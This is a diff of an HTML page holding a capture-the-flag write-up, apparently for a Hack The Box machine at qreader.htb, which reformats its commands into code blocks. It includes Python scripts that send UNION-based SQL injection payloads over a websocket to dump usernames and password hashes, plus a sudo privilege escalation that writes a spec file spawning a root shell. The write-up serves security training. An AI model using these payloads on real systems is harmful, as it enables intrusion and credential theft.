@@ -164,15 +164,26 @@ body {
 <p><img src="https://miro.medium.com/v2/resize:fit:700/0*ZzbP_vYOJl6pJajC.png" alt=""></p>
 <h1 id="enumeration-">Enumeration:</h1>
 <p><strong>Nmap Result</strong></p>
-<p>sudo nmap -sV -sC -A 10.10.11.206</p>
+          
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ command </span><span class="p">used
+sudo nmap -sV -sC -A 10.10.11.206
+  </span>
+</code></pre></div></div><br>          
+          
 <p><img src="https://miro.medium.com/v2/resize:fit:700/0*17K1xym-FAzLGeA0.png" alt=""></p>
 <p><strong>Scan Result:</strong></p>
 <p>22 tcp open port for ssh</p>
 <p>80 tcp open port for http</p>
 <p>Websocket on port 5789</p>
 <p>let’s do a vulnerability scan of websocket in port 5789 with  <a href="https://github.com/PalindromeLabs/STEWS">STEWS</a></p>
-<h5 id="github-palindromelabs-stews-a-security-tool-for-enumerating-websockets">GitHub - PalindromeLabs/STEWS: A Security Tool for Enumerating WebSockets</h5>
-<p>python3 STEWS-vuln-detect.py -1 -n -u 10.10.11.206:5789</p>
+<p>GitHub - PalindromeLabs/STEWS: A Security Tool for Enumerating WebSockets</p>
+          
+<code><span class="ve">❯ command </span><span class="p">used
+python3 STEWS-vuln-detect.py -1 -n -u 10.10.11.206:5789
+  </span>
+</code></pre></div></div><br>           
+          
 <p><img src="https://miro.medium.com/v2/resize:fit:700/0*7urD5zisq7WEzgUu.png" alt=""></p>
 <p>We came to know about a vulnerable url which is  <strong>ws://qreader.htb:5789</strong></p>
 <p><strong>Browsing Website :</strong></p>
@@ -182,22 +193,57 @@ body {
 <p>Through this website we can generate and scan a qr code.</p>
 <p><img src="https://miro.medium.com/v2/resize:fit:700/0*pou0qWZvghBwUIOm.png" alt=""></p>
 <p>Also we can download the software for windows and linux so, let’s download the .exe file and decompile it using  <a href="https://github.com/extremecoders-re/pyinstxtractor">pyinstxtractor</a>.</p>
-<h4 id="github-extremecoders-re-pyinstxtractor-pyinstaller-extractor">GitHub - extremecoders-re/pyinstxtractor: PyInstaller Extractor</h4>
-<blockquote>
-<p>python3 pyinstxtractor.py qreader.exe</p>
-</blockquote>
+<p>GitHub - extremecoders-re/pyinstxtractor: PyInstaller Extractor</p>
+  
+<code><span class="ve">❯ command </span><span class="p">used
+python3 pyinstxtractor.py qreader.exe
+  </span>
+</code></pre></div></div><br>   
+  
 <p><img src="https://miro.medium.com/v2/resize:fit:700/0*4NGSjNybLp9Qam1C.png" alt=""></p>
 <p>Now go to extracted folder &amp; and examine the qreader.pyc file.</p>
-<p>pip3 install uncompyle6  </p>
-<p>uncompyle6 qreader.pyc &gt; qreader.py</p>
+
+<code><span class="ve">❯ command </span><span class="p">used
+pip3 install uncompyle6
+
+uncompyle6 qreader.pyc > qreader.py
+  </span>
+</code></pre></div></div><br> 
+
 <p>After analyzing the qreader.py file we found the vulnerability as you can see below.</p>
 <p><img src="https://miro.medium.com/v2/resize:fit:700/0*xCCvX9ZxTyzgUTM9.png" alt=""></p>
 <p>Let’s make a python script to exploit the SQL Injection found in the above source code.</p>
-<p>from websocket import create_connection<br>import json<br>ws_host = &#39;ws://qreader.htb:5789&#39;<br>VERSION = &#39;0.0.3&quot; UNION SELECT group_concat(answer),&quot;2&quot;,&quot;3&quot;,&quot;4&quot; FROM answers;-- -&#39;<br>ws = create_connection(ws_host + &#39;/version&#39;)<br>ws.send(json.dumps({&#39;version&#39;: VERSION}))<br>result = ws.recv()<br>print(result)<br>ws.close()</p>
+
+<code><span class="ve">❯ code </span><span class="p">-->
+from websocket import create_connection
+import json
+ws_host = 'ws://qreader.htb:5789'
+VERSION = '0.0.3" UNION SELECT group_concat(answer),"2","3","4" FROM answers;-- -'
+ws = create_connection(ws_host + '/version')
+ws.send(json.dumps({'version': VERSION}))
+result = ws.recv()
+print(result)
+ws.close()
+  </span>
+</code></pre></div></div><br> 
+
 <p>Above code will print all the user as shown below.</p>
 <p><img src="https://miro.medium.com/v2/resize:fit:700/0*hB3PqA9MMkATMzL0.png" alt=""></p>
 <p>Lets write a code to print password of user.</p>
-<p>from websocket import create_connection<br>import json<br>ws_host = &#39;ws://qreader.htb:5789&#39;<br>VERSION = &#39;0.0.3&quot; UNION SELECT username,password,&quot;3&quot;,&quot;4&quot; from users;-- -&#39;<br>ws = create_connection(ws_host + &#39;/version&#39;)<br>ws.send(json.dumps({&#39;version&#39;: VERSION}))<br>result = ws.recv()<br>print(result)<br>ws.close()</p>
+
+<code><span class="ve">❯ code </span><span class="p">-->
+from websocket import create_connection
+import json
+ws_host = 'ws://qreader.htb:5789'
+VERSION = '0.0.3" UNION SELECT username,password,"3","4" from users;-- -'
+ws = create_connection(ws_host + '/version')
+ws.send(json.dumps({'version': VERSION}))
+result = ws.recv()
+print(result)
+ws.close()
+  </span>
+</code></pre></div></div><br> 
+
 <p><img src="https://miro.medium.com/v2/resize:fit:700/0*RD0P0UrNL-iKcntz.png" alt=""></p>
 <p>As you can see we got our password and we can decrypt this at crackstation.net website as shown below.</p>
 <p><img src="https://miro.medium.com/v2/resize:fit:700/0*-47M9HO84ouiYjJI.png" alt=""></p>
@@ -209,13 +255,17 @@ body {
 <p>build-installer.sh can be run as root without password.</p>
 <p><img src="https://miro.medium.com/v2/resize:fit:700/0*4WIcr7_wT1JWZ4g0.png" alt=""></p>
 <p>Command used</p>
-<p>echo &#39;import os;os.system(&quot;/bin/bash&quot;)&#39; &gt; root.spec  </p>
-<p>sudo /usr/local/sbin/build-installer.sh build root.spec</p>
+
+<code><span class="ve">❯ code </span><span class="p">-->
+echo 'import os;os.system("/bin/bash")' > root.spec
+
+sudo /usr/local/sbin/build-installer.sh build root.spec
+  </span>
+</code></pre></div></div><br> 
+
 <p><img src="https://miro.medium.com/v2/resize:fit:700/0*pzmMd1xHQNkTyuC9.png" alt=""></p>
 <p>As you can see we got our root flag.</p>
 <p><strong>Thankyou For Reading.</strong></p>
-
-
 
 
 </article>
